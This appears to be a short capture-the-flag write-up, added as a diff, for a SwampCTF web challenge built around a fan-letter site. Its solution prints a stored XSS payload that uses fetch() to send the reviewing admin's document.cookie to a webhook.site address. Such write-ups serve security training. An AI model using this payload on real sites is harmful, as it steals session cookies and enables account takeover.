@@ -1,0 +1,19 @@
+* Description 
+Welcome to the glitzy world of Broadway! the hit revival of 'Sunset Boulevard' starring Nicole Scherzinger has taken
+the theater world by storm. As part of the fan engagement team, you're discovered a website where fans can send letters
+to the star. However, rumors suggest that a *hidden admin dashboard* contains something valuable-possibly the CTF flag.
+
+http://chals.swampctf.com:41218
+
+* Solution
+
+When open the site, we can see a =form= to send a letter, and description hint us that admin will =review= the letter.
+So maybe there's XSS injection to exploit.
+
+#+begin_src javascript
+<script>
+fetch("https://webhook.site/2b96145b-5a94-4c8c-a2b5-ef09464a175d?c=" + document.cookie);
+</script>
+#+end_src
+
+after send it to admin, we can get flag in cookie in [[https://webhook.site][webhook-site]]
